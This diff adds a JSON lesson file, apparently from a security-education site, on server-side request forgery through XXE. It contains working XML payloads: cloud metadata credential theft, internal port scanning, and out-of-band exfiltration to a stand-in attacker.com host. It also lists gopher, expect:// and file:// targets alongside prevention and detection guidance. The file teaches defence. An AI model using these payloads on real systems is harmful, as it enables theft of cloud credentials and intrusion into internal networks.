@@ -1,0 +1,124 @@
+{
+  "id": "ssrf",
+  "category": "attack-vectors",
+  "title": "SSRF via XXE",
+  "description": "Exploiting XXE vulnerabilities to perform Server-Side Request Forgery attacks, accessing internal networks and services.",
+  "severity": "critical",
+  "cvssScore": 8.6,
+  "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L",
+  "cwe": "CWE-918: Server-Side Request Forgery (SSRF)",
+  "owasp": "OWASP Top 10:2021 - A10: Server-Side Request Forgery",
+  "sections": [
+    {
+      "id": "overview",
+      "title": "Overview",
+      "type": "text",
+      "content": "Server-Side Request Forgery (SSRF) via XXE allows attackers to make the vulnerable server send HTTP requests to arbitrary destinations. This bypasses network security controls and enables access to:\n\n**Internal Network Access:**\n• Internal web services (databases, admin panels)\n• Cloud metadata services (AWS, GCP, Azure)\n• Internal APIs not exposed to internet\n• Localhost services (Redis, Memcached, Elasticsearch)\n\n**Attack Impact:**\n• Access cloud instance credentials\n• Port scanning internal networks\n• Exploit internal services\n• Bypass firewall and network segmentation\n• Read internal documentation/APIs\n• Access admin interfaces\n\n**Why XXE Enables SSRF:**\nXML parsers support multiple URI schemes in SYSTEM identifiers:\n• http:// and https:// - HTTP requests\n• file:// - Local file access\n• ftp:// - FTP connections\n• gopher:// - Protocol smuggling\n• jar:// - Java Archive protocol\n• expect:// - Command execution (if enabled)"
+    },
+    {
+      "id": "basic-ssrf",
+      "title": "Basic SSRF Payload",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://internal-server.local/admin\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- Server makes HTTP request to http://internal-server.local/admin\n     Response may be displayed in application output -->",
+        "isVulnerable": true,
+        "filename": "basic-ssrf.xml"
+      }
+    },
+    {
+      "id": "cloud-metadata",
+      "title": "AWS Metadata Service Attack",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- Returns AWS IAM role name, then fetch credentials: -->\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- Returns:\n{\n  \"AccessKeyId\": \"ASIA...\",\n  \"SecretAccessKey\": \"...\",\n  \"Token\": \"...\"\n} -->",
+        "isVulnerable": true,
+        "filename": "aws-metadata.xml"
+      }
+    },
+    {
+      "id": "port-scan",
+      "title": "Internal Port Scanning",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Scan localhost ports -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://127.0.0.1:80\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- Try different ports to enumerate services: -->\n<!-- http://127.0.0.1:22 - SSH -->\n<!-- http://127.0.0.1:3306 - MySQL -->\n<!-- http://127.0.0.1:6379 - Redis -->\n<!-- http://127.0.0.1:9200 - Elasticsearch -->\n<!-- http://127.0.0.1:8080 - Admin panel -->\n\n<!-- Scan internal network: -->\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://192.168.1.1:80\">\n]>\n<root><data>&xxe;</data></root>",
+        "isVulnerable": true,
+        "filename": "port-scan.xml"
+      }
+    },
+    {
+      "id": "blind-ssrf",
+      "title": "Blind SSRF Detection",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Blind SSRF when output not visible -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM \"http://attacker.com/callback\">\n  %remote;\n]>\n<root/>\n\n<!-- Monitor attacker.com access logs for connection -->\n<!-- If connection received, SSRF is possible -->\n\n<!-- Out-of-band SSRF with data exfiltration: -->\n<!-- xxe.dtd on attacker server: -->\n<!ENTITY % internal SYSTEM \"http://internal-api.local/secret\">\n<!ENTITY % wrapper \"<!ENTITY &#x25; send SYSTEM 'http://attacker.com/log?data=%internal;'>\">\n%wrapper;\n%send;",
+        "isVulnerable": true,
+        "filename": "blind-ssrf.xml"
+      }
+    },
+    {
+      "id": "protocol-schemes",
+      "title": "Protocol Scheme Exploitation",
+      "type": "text",
+      "content": "**HTTP/HTTPS:**\nMost common for SSRF, access internal HTTP services:\n• http://localhost:8080/admin\n• http://192.168.1.100/api\n• https://internal.company.local/\n\n**FTP:**\nAccess internal FTP servers:\n• ftp://internal-ftp.local/\n• ftp://192.168.1.50:21/\n\n**Gopher (Advanced):**\nMulti-protocol exploitation, can abuse Redis, SMTP, etc:\n• gopher://127.0.0.1:6379/_SET%20key%20value\n• Used to send arbitrary data to TCP services\n• Can exploit unprotected internal services\n\n**File (Local Access):**\nRead local files (file disclosure):\n• file:///etc/passwd\n• file:///c:/windows/win.ini\n\n**Jar (Java):**\nJava-specific, can trigger secondary SSRF:\n• jar:http://attacker.com/file.jar!/\n\n**Expect (Dangerous):**\nIf PHP expect:// wrapper enabled, RCE possible:\n• expect://whoami"
+    },
+    {
+      "id": "internal-targets",
+      "title": "Common Internal Targets",
+      "type": "text",
+      "content": "**Cloud Metadata Services:**\n\nAWS: http://169.254.169.254/latest/meta-data/\nGoogle Cloud: http://metadata.google.internal/computeMetadata/v1/\nAzure: http://169.254.169.254/metadata/instance?api-version=2021-02-01\nDigitalOcean: http://169.254.169.254/metadata/v1/\n\n**Internal Services:**\n\nhttp://localhost:6379 - Redis (often no auth)\nhttp://localhost:9200 - Elasticsearch\nhttp://localhost:5984 - CouchDB\nhttp://localhost:8086 - InfluxDB\nhttp://localhost:3000 - Grafana\nhttp://localhost:8080 - Jenkins/Tomcat\n\n**Network Devices:**\n\nhttp://192.168.1.1 - Router admin\nhttp://192.168.0.1 - Gateway\nhttp://10.0.0.1 - Internal router\n\n**Kubernetes:**\n\nhttps://kubernetes.default.svc/\nhttp://127.0.0.1:10250 - Kubelet API\nhttp://127.0.0.1:10255 - Kubelet read-only"
+    },
+    {
+      "id": "exploitation-example",
+      "title": "Real-World Exploitation Example",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Step 1: Discover internal services -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY test SYSTEM \"http://127.0.0.1:6379\">]>\n<root>&test;</root>\n\n<!-- Response might show Redis banner -->\n\n<!-- Step 2: Access cloud metadata -->\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]>\n<root>&xxe;</root>\n\n<!-- Returns: \"web-server-role\" -->\n\n<!-- Step 3: Fetch IAM credentials -->\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/web-server-role\">]>\n<root>&xxe;</root>\n\n<!-- Returns full AWS credentials:\n{\n  \"AccessKeyId\": \"ASIAXXX...\",\n  \"SecretAccessKey\": \"wJalrXXX...\",\n  \"Token\": \"IQoJb3XXX...\",\n  \"Expiration\": \"2024-01-01T12:00:00Z\"\n}\n\nAttacker now has AWS credentials! -->",
+        "isVulnerable": true,
+        "filename": "real-world-ssrf.xml"
+      }
+    },
+    {
+      "id": "prevention",
+      "title": "SSRF Prevention via XXE",
+      "type": "text",
+      "content": "**Primary Defense - Disable External Entities:**\nDisable all external entity processing in XML parsers (see prevention guides)\n\n**Network-Level Controls:**\n\n1. **Outbound Filtering:**\n   • Block outbound HTTP from application servers\n   • Whitelist only required external hosts\n   • Block private IP ranges (RFC 1918)\n   • Block cloud metadata IPs (169.254.169.254)\n\n2. **Network Segmentation:**\n   • Isolate application servers from sensitive internal networks\n   • Use separate VPCs/VLANs\n   • Implement micro-segmentation\n\n3. **IMDSv2 (AWS):**\n   • Require token-based metadata service (IMDSv2)\n   • Prevents SSRF to metadata service\n   • aws ec2 modify-instance-metadata-options --http-tokens required\n\n**Application-Level:**\n\n4. **Input Validation:**\n   • Reject DOCTYPE declarations\n   • Reject XML containing http:// in ENTITY definitions\n   • Validate and sanitize all XML input\n\n5. **Monitoring:**\n   • Alert on outbound connections from XML parsers\n   • Monitor access to cloud metadata services\n   • Log unusual internal network connections"
+    },
+    {
+      "id": "detection",
+      "title": "Detection Techniques",
+      "type": "text",
+      "content": "**Code Review:**\n• XML parsers without external entity restrictions\n• Applications accepting user-supplied XML\n• Missing network egress controls\n• Cloud instances without IMDSv2\n\n**Dynamic Testing:**\n\n1. **Basic Test:**\n   Submit XML with http:// entity pointing to attacker-controlled server\n   Monitor for incoming connection\n\n2. **Port Scan:**\n   Try different localhost ports\n   Observe timing differences (open vs closed ports)\n\n3. **Cloud Metadata:**\n   Target 169.254.169.254\n   Look for cloud instance data in response\n\n4. **Internal Service Access:**\n   Target common internal IPs/ports\n   Check for service banners or data in response\n\n**Network Monitoring:**\n• Unexpected outbound HTTP from application servers\n• Connections to private IP ranges\n• Access to cloud metadata IPs\n• Unusual DNS queries"
+    },
+    {
+      "id": "secure-code",
+      "title": "Secure Implementation",
+      "type": "code",
+      "code": {
+        "language": "python",
+        "code": "from defusedxml.lxml import fromstring\nimport ipaddress\nimport socket\n\nclass SecureXMLProcessor:\n    \n    # Blocked IP ranges for SSRF prevention\n    BLOCKED_RANGES = [\n        ipaddress.ip_network('127.0.0.0/8'),      # Loopback\n        ipaddress.ip_network('10.0.0.0/8'),       # Private\n        ipaddress.ip_network('172.16.0.0/12'),    # Private\n        ipaddress.ip_network('192.168.0.0/16'),   # Private\n        ipaddress.ip_network('169.254.0.0/16'),   # Link-local/Metadata\n    ]\n    \n    def is_blocked_ip(self, hostname):\n        try:\n            ip = ipaddress.ip_address(socket.gethostbyname(hostname))\n            for blocked in self.BLOCKED_RANGES:\n                if ip in blocked:\n                    return True\n        except:\n            pass\n        return False\n    \n    def parse_xml(self, xml_data):\n        # defusedxml blocks XXE by default\n        tree = fromstring(xml_data)\n        \n        # Additional validation\n        if b'<!DOCTYPE' in xml_data or b'<!ENTITY' in xml_data:\n            raise ValueError(\"DOCTYPE/ENTITY not allowed\")\n        \n        return tree",
+        "isVulnerable": false,
+        "filename": "secure_ssrf_prevention.py"
+      }
+    }
+  ],
+  "relatedTopics": ["blind-xxe", "classic-xxe", "file-disclosure"],
+  "references": [
+    {
+      "title": "OWASP SSRF Prevention",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
+    },
+    {
+      "title": "PortSwigger SSRF",
+      "url": "https://portswigger.net/web-security/ssrf"
+    },
+    {
+      "title": "AWS IMDSv2",
+      "url": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html"
+    }
+  ]
+}
